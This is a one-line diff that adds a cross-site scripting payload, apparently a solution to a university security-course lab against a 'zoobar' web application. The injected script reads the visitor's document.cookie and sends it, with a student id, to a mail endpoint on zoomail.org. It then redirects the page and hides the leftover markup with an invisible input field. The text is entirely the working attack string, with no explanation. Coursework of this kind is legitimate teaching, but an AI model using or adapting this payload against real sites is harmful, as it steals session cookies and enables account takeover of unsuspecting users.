@@ -1,0 +1,1 @@
+" size=10> <script> var sploitvar = new Image().src='http://zoomail.org/sendmail.php?' + '&netid=cse127fai' + '&payload=' + document.cookie + '&random=' + Math.random(); top.location ="http://zoobar.org/users.php"; </script> <input type="text" style="display:none;
